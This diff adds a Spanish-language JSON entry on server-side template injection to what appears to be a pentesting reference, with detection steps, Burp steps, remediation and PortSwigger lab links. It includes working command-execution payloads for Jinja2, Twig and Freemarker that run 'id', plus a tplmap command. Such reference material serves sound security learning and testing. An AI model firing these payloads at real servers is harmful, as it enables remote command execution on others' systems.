@@ -1,0 +1,61 @@
+{
+  "id": "ssti",
+  "name": "Server-Side Template Injection (SSTI)",
+  "category": "Injection",
+  "severity": "Critical",
+  "aka": ["SSTI"],
+  "summary": "El input del usuario se inserta en una plantilla del lado servidor de forma insegura, permitiendo ejecutar expresiones del motor de plantillas y, frecuentemente, llegar a RCE.",
+  "where_to_look": [
+    "Funciones que renderizan plantillas con datos del usuario: emails personalizados, páginas de error, perfiles.",
+    "Parámetros que se reflejan tras pasar por un motor (Jinja2, Twig, Freemarker, Velocity, ERB)."
+  ],
+  "detection": [
+    "Inyecta una expresión matemática: ${7*7}, {{7*7}}, <%= 7*7 %> y mira si devuelve 49.",
+    "Si evalúa, identifica el motor con un payload políglota y luego refina por sintaxis.",
+    "Distingue de XSS: en SSTI la operación se evalúa en el servidor, no en el navegador."
+  ],
+  "burp_steps": [
+    "En Repeater, prueba {{7*7}} y ${7*7} en cada parámetro reflejado.",
+    "Confirma el motor: {{7*'7'}} → 7777777 (Jinja2/Python) vs 49 (Twig).",
+    "Escala a lectura de objetos internos y de ahí a ejecución de comandos.",
+    "Documenta el payload mínimo que prueba RCE (p. ej. listar archivos)."
+  ],
+  "payloads": {
+    "Detección (políglota)": [
+      "${{<%[%'\"}}%\\",
+      "{{7*7}}",
+      "${7*7}",
+      "<%= 7*7 %>",
+      "#{7*7}"
+    ],
+    "Jinja2 (Python)": [
+      "{{7*'7'}}",
+      "{{config.items()}}",
+      "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+    ],
+    "Twig (PHP)": [
+      "{{7*7}}",
+      "{{['id']|filter('system')}}",
+      "{{['id']|map('system')|join}}"
+    ],
+    "Freemarker (Java)": [
+      "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+    ]
+  },
+  "commands": [
+    {"tool": "tplmap", "desc": "Detección/explotación automática de SSTI", "cmd": "tplmap.py -u 'https://lab/?name=test'"}
+  ],
+  "remediation": [
+    "No concatenes input del usuario dentro de plantillas; pásalo como datos/variables.",
+    "Usa motores en modo sandbox y plantillas estáticas con contexto controlado.",
+    "Valida y escapa el input según el contexto."
+  ],
+  "portswigger_labs": [
+    {"title": "SSTI básica", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic"},
+    {"title": "SSTI en motor desconocido (metodología)", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit"}
+  ],
+  "references": [
+    {"title": "PortSwigger — SSTI", "url": "https://portswigger.net/web-security/server-side-template-injection"},
+    {"title": "PayloadsAllTheThings — SSTI", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"}
+  ]
+}
